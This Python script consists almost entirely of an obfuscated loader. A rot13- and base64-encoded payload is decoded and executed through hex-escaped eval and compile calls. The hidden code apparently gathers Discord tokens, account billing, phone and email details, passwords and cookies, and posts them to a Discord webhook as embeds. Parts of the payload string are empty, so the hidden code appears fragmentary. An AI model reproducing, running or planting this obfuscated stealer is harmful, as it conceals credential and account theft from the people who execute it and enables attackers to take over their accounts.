import base64, codecs
magic = ''
love = '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'
god = ''
destiny = ''
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
